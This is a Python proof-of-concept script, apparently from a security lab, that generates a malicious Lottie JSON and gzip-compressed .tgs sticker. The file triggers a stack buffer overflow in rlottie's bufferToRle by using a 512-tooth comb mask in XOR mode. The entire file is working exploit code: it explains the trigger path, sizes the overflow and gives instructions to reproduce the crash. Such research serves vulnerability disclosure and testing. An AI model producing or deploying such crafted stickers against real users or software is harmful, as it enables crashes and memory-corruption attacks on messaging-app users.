#!/usr/bin/env python3
"""
lab1/gen_poc.py
Generate a minimal Lottie JSON / .tgs sticker that triggers the
bufferToRle stack overflow in rlottie vrle.cpp.

Usage:
    python3 gen_poc.py [--out poc.tgs] [--json poc.json] [--teeth N]

The output is a valid .tgs file (gzip-compressed Lottie JSON) that
causes rleOpGeneric() to overflow a 256-element stack buffer with
512 VRle::Span entries (~2048 bytes) when the sticker is rendered.

Trigger path:
    parse masksProperties → mode "f" (Difference)
    → maskRle(): rle = rle ^ i.rle()
    → operator^  → opGeneric(Xor)
    → rleOpGeneric
    → bufferToRle(1024-byte coverage buf, 256-span stack temp)  ← OVERFLOW
"""

import argparse
import gzip
import json
import sys


def make_rect_path(x0: float, y0: float, x1: float, y1: float) -> dict:
    """Return a closed Lottie bezier path dict for a rectangle."""
    verts = [[x0, y0], [x1, y0], [x1, y1], [x0, y1]]
    zeros = [[0, 0]] * 4
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def make_comb_path(canvas_w: int, canvas_h: int, n_teeth: int) -> dict:
    """
    Return a closed Lottie bezier path dict for a comb with n_teeth teeth.

    The comb is a single closed polygon that, when rasterised with the
    non-zero winding rule, produces one 1-pixel-wide filled column every
    two pixels:
        filled at x=1..2, x=3..4, x=5..6, ...

    This gives n_teeth spans per scanline.  With n_teeth=512 and a
    1024-pixel-wide canvas the coverage buffer has 512 alternating runs,
    which is double the 256-element temp[] capacity → overflow.

    Path outline (vertices listed top-to-bottom then back):

        (0,0) ──► (1,0)
                    │
                   (1,H) ──► (2,H)
                               │
                    (2,0) ◄── (2,H)  [upward stroke, creates +/- winding flip]
        (2,0) ──► (3,0)
                    │
                   (3,H) ──► (4,H)
                               │
                    (4,0) ◄── (4,H)
        ...
        (n*2, 0)  close back via bottom edge (canvas_w, H) and left edge (0, H)

    Winding at y = canvas_h/2 (interior scanline):
        downward strokes at x=1, 3, 5, ...  → each +1 crossing
        upward   strokes at x=2, 4, 6, ...  → each -1 crossing
        Cumulative winding to the right of each x:
            x<1  : 0  (outside)
            1<x<2: 1  (inside, filled)
            2<x<3: 0  (outside)
            3<x<4: 1  (inside, filled)
            ...
    → n_teeth filled 1-pixel-wide columns → n_teeth RLE spans per row.
    """
    H = float(canvas_h)
    verts = []

    # Build the comb "teeth" going across the canvas.
    # Each tooth occupies 1px (odd x) with a 1px gap (even x).
    # The polygon traces:
    #   top-right of gap → top-right of tooth → bottom → bottom of gap → up
    for k in range(n_teeth):
        x_gap_left  = float(2 * k)       # left edge of gap k
        x_tooth_l   = float(2 * k + 1)   # left edge of tooth k
        x_tooth_r   = float(2 * k + 2)   # right edge of tooth k (= left of next gap)

        # go right along top of the gap
        verts.append([x_gap_left, 0.0])
        # go right along top of the tooth
        verts.append([x_tooth_l, 0.0])
        # go down the right side of the tooth
        verts.append([x_tooth_l, H])
        # go right along the bottom into the next gap
        verts.append([x_tooth_r, H])

    # Close along the bottom edge back to (0, H), then up to (0, 0)
    verts.append([float(canvas_w), H])
    verts.append([0.0, H])
    # The path auto-closes from here back to verts[0] = (0,0)

    n = len(verts)
    zeros = [[0.0, 0.0]] * n
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def build_lottie(canvas_w: int, canvas_h: int, n_teeth: int) -> dict:
    """
    Assemble the minimal Lottie composition that triggers the overflow.

    Layer structure:
        ty=4 (shape layer) with:
            shapes: one filled rectangle (gives the layer visible content)
            masksProperties:
                [0] mode="a" (Add): solid rectangle covering the full canvas
                    → after processing: rle = solid_rect_rle  (no opGeneric call,
                      operator+ returns 'o' when first operand is empty)
                [1] mode="f" (Difference/XOR): comb with 512 teeth
                    → rle = rle ^ comb_rle
                    → opGeneric(Xor) → rleOpGeneric → bufferToRle → OVERFLOW
    """
    # Lottie coordinates: origin top-left, same scale as canvas pixels.
    solid_path = make_rect_path(0, 0, canvas_w, canvas_h)
    comb_path  = make_comb_path(canvas_w, canvas_h, n_teeth)

    def static_path(path_dict):
        return {"a": 0, "k": path_dict}

    def static_val(v):
        return {"a": 0, "k": v}

    identity_ks = {
        "p": static_val([canvas_w / 2, canvas_h / 2, 0]),
        "a": static_val([0, 0, 0]),
        "s": static_val([100, 100, 100]),
        "r": static_val(0),
        "o": static_val(100),
    }

    layer = {
        "ty": 4,
        "nm": "OverflowLayer",
        "ind": 1,
        "st": 0,
        "ip": 0,
        "op": 2,        # just 2 frames is enough
        "sr": 1,
        "ks": identity_ks,
        "hasMask": True,
        "masksProperties": [
            {
                # mask[0]: Add – builds up solid rle
                "mode": "a",
                "inv": False,
                "pt": static_path(solid_path),
                "o":  static_val(100),
            },
            {
                # mask[1]: Difference (mode "f") – XOR triggers overflow
                "mode": "f",
                "inv": False,
                "pt": static_path(comb_path),
                "o":  static_val(100),
            },
        ],
        "shapes": [
            {
                "ty": "gr",
                "nm": "G",
                "it": [
                    {
                        "ty": "rc",
                        "nm": "Rect",
                        "p":  static_val([0, 0]),
                        "s":  static_val([canvas_w, canvas_h]),
                        "r":  static_val(0),
                    },
                    {
                        "ty": "fl",
                        "nm": "Fill",
                        "c":  static_val([1, 0, 0, 1]),
                        "o":  static_val(100),
                        "r":  1,
                    },
                ],
            }
        ],
    }

    return {
        "v":      "5.5.2",
        "fr":     60,
        "ip":     0,
        "op":     2,
        "w":      canvas_w,
        "h":      canvas_h,
        "nm":     "rlottie-overflow-poc",
        "ddd":    0,
        "assets": [],
        "layers": [layer],
    }


def main():
    ap = argparse.ArgumentParser(description="Generate rlottie stack-overflow PoC sticker")
    ap.add_argument("--out",   default="poc.tgs",  help="Output .tgs path")
    ap.add_argument("--json",  default="poc.json", help="Output plain JSON path (optional)")
    ap.add_argument("--teeth", type=int, default=512,
                    help="Number of comb teeth (>=257 overflows). Default=512")
    ap.add_argument("--width", type=int, default=1024,
                    help="Canvas width. Must be >= 2*teeth. Default=1024")
    ap.add_argument("--height", type=int, default=128,
                    help="Canvas height. Default=128")
    args = ap.parse_args()

    if args.teeth < 257:
        print(f"[warn] {args.teeth} teeth produces ≤256 spans → no overflow. Use ≥257.",
              file=sys.stderr)
    if args.width < 2 * args.teeth:
        print(f"[error] width {args.width} < 2*{args.teeth} teeth. Increase --width.",
              file=sys.stderr)
        sys.exit(1)

    lottie = build_lottie(args.width, args.height, args.teeth)
    json_bytes = json.dumps(lottie, separators=(",", ":")).encode("utf-8")

    # Write plain JSON for inspection
    with open(args.json, "wb") as f:
        f.write(json_bytes)
    print(f"[+] Lottie JSON  : {args.json}  ({len(json_bytes):,} bytes)")

    # .tgs = gzip-compressed JSON (mtime=0 for reproducibility)
    import io
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(json_bytes)
    tgs_bytes = buf.getvalue()

    with open(args.out, "wb") as f:
        f.write(tgs_bytes)
    print(f"[+] Sticker .tgs : {args.out}  ({len(tgs_bytes):,} bytes)")
    print()
    print(f"    Canvas      : {args.width} × {args.height} px")
    print(f"    Comb teeth  : {args.teeth}  (spans emitted per row by bufferToRle)")
    print(f"    temp[] size : 256 spans  ({256*8} bytes)")
    print(f"    Overflow    : {max(0, args.teeth-256)} spans × 8 bytes = "
          f"{max(0, args.teeth-256)*8} bytes past stack buffer")
    print()
    print("To test with the rlottie example renderer:")
    print(f"    <rlottie-build>/example/lottie2gif {args.json} out.gif 128 128")
    print("(Should crash / ASan-report if built with -fsanitize=address)")


if __name__ == "__main__":
    main()
